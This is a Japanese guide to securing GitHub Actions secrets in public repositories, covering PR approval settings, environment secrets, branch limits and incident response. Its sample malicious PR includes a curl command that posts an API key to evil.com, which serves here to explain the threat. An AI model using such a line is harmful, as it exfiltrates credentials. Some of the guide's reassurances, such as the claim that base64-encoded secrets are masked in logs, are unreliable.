# GitHub Actions セキュリティガイド

## 🔒 GitHub Secretsは安全か？

### ✅ はい、Publicリポジトリでも安全です！

GitHub Secretsは以下の方法で保護されています：

1. **暗号化保存**
   - すべてのSecretsはAES-256で暗号化されて保存
   - GitHubの管理者でも復号化できません

2. **アクセス制限**
   - リポジトリのオーナーと管理者のみが設定可能
   - 閲覧者やコントリビューターは見られません

3. **自動マスキング**
   - ワークフローログで自動的に`***`でマスク
   - 誤って出力されても保護されます

4. **読み取り専用**
   - 一度登録すると、値を確認できません（更新のみ可能）

---

## ⚠️ Publicリポジトリでの注意点

### リスク：外部からのPRでの攻撃

Publicリポジトリでは誰でもPRを作成できるため、以下のような攻撃が考えられます：

```yaml
# 悪意のあるPRの例
- name: 攻撃の試み
  run: |
    # 直接出力 → 自動でマスクされる ✅
    echo "${{ secrets.API_KEY }}"
    
    # Base64エンコードして回避を試みる → これも検知される ✅
    echo "${{ secrets.API_KEY }}" | base64
    
    # 外部サーバーに送信を試みる → sandboxで防がれる可能性 ⚠️
    curl -X POST https://evil.com/steal -d "${{ secrets.API_KEY }}"
```

---

## 🛡️ 推奨されるセキュリティ対策

### 1. 外部PRの承認制を有効化（必須）

**設定手順：**

1. リポジトリ **Settings** → **Actions** → **General**
2. **Fork pull request workflows** セクション
3. 以下を選択：

```
推奨設定：
☑ Require approval for first-time contributors
```

または、より厳格な設定：

```
最も安全：
☑ Require approval for all outside collaborators
```

**効果：**
- 初回またはすべての外部コントリビューターのPRは手動承認が必要
- 承認されない限り、Secretsにアクセスできません

### 2. Environment Secretsを使用（推奨）

通常のRepository SecretsよりもEnvironment Secretsの方が安全です。

#### Repository Secretsとの違い

| 項目 | Repository Secrets | Environment Secrets |
|------|-------------------|---------------------|
| 利用範囲 | すべてのワークフロー | 特定のジョブのみ |
| 承認 | 不要 | 設定可能 |
| ブランチ制限 | なし | 特定ブランチのみ可能 |
| PRからのアクセス | 制限あり | より厳格な制限 |

#### 設定方法

**Step 1: Environmentを作成**

1. リポジトリ **Settings** → **Environments**
2. **New environment** をクリック
3. 名前を入力（例：`production`）

**Step 2: 保護ルールを設定**

```
推奨設定：
☑ Required reviewers: 自分や信頼できるメンバーを追加
☑ Protected branches: main のみ許可
☑ Wait timer: 0 minutes（必要に応じて）
```

**Step 3: Environment Secretsを登録**

1. 作成したEnvironmentを選択
2. **Add secret** で必要なSecretsを登録

**Step 4: ワークフローで使用**

```yaml
jobs:
  deploy:
    runs-on: macos-latest
    environment:
      name: production  # Environmentを指定
      url: https://appstoreconnect.apple.com
    
    steps:
      - name: デプロイ
        env:
          API_KEY: ${{ secrets.API_KEY }}  # Environment Secretを使用
        run: ./deploy.sh
```

### 3. ワークフローの制限

#### 重要なワークフローは特定ブランチのみで実行

```yaml
name: Deploy iOS

on:
  push:
    branches:
      - main  # mainブランチのみ
    tags:
      - 'v*.*.*'
  # PRからは実行しない（workflow_dispatchのみ許可）
  workflow_dispatch:
```

#### PRからSecretsが必要なワークフローを実行しない

```yaml
# CI用（Secretsが不要な場合）
on:
  pull_request:  # PRでも実行OK
  
# デプロイ用（Secretsが必要な場合）
on:
  push:
    branches: [main]  # PRでは実行しない
```

### 4. Secretsの最小権限の原則

必要なワークフローにのみ、必要なSecretsのみを提供：

```yaml
# 悪い例：すべてのSecretsを渡す
env:
  API_KEY: ${{ secrets.API_KEY }}
  DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
  DB_PASSWORD: ${{ secrets.DB_PASSWORD }}

# 良い例：必要なもののみ
env:
  API_KEY: ${{ secrets.API_KEY }}
```

---

## 📋 セキュリティチェックリスト

### 初期設定時

- [ ] 外部PRの承認制を有効化
- [ ] Environmentを作成（production, staging など）
- [ ] Environment保護ルールを設定
- [ ] デプロイワークフローでEnvironmentを指定

### Secrets登録時

- [ ] Repository Secretsは最小限に
- [ ] 機密性の高いSecretsはEnvironment Secretsに
- [ ] 定期的に更新（特にApp用パスワード）
- [ ] 不要になったSecretsは削除

### ワークフロー作成時

- [ ] PRから実行されるワークフローではSecretsを使わない
- [ ] デプロイはmainブランチまたはタグのみ
- [ ] Environment保護を指定
- [ ] 必要最小限のSecretsのみ使用

### 定期的な確認

- [ ] Actionsタブでワークフロー実行履歴を確認
- [ ] 不審なPRがないかチェック
- [ ] Secretsの有効期限を確認（App用パスワードなど）

---

## 🚨 インシデント対応

### Secretsが漏洩した可能性がある場合

1. **即座に無効化**
   ```bash
   # Apple App用パスワード
   # → appleid.apple.com で該当パスワードを削除
   
   # Firebase APIキー
   # → Firebaseコンソールで制限を追加またはキーを再生成
   
   # Apple証明書
   # → Apple Developer Portalで証明書を失効
   ```

2. **GitHubでSecretsを更新**
   - Settings → Secrets → 該当Secretを削除して再登録

3. **ワークフロー履歴を確認**
   - Actions タブで不審な実行がないか確認

4. **必要に応じてGitHubサポートに連絡**

---

## 📚 参考リンク

- [GitHub Actions のセキュリティ強化](https://docs.github.com/ja/actions/security-guides/security-hardening-for-github-actions)
- [暗号化されたシークレット](https://docs.github.com/ja/actions/security-guides/encrypted-secrets)
- [デプロイにEnvironmentを使用する](https://docs.github.com/ja/actions/deployment/targeting-different-environments/using-environments-for-deployment)

---

## 💡 まとめ

### Publicリポジトリでも安全に使える？

**はい！** ただし以下の対策が必須です：

1. ✅ 外部PRの承認制を有効化
2. ✅ デプロイにはEnvironment Secretsを使用
3. ✅ 重要なワークフローはmainブランチのみで実行
4. ✅ 定期的なSecrets更新

これらを実施すれば、Publicリポジトリでも安全にSecretsを使用できます！

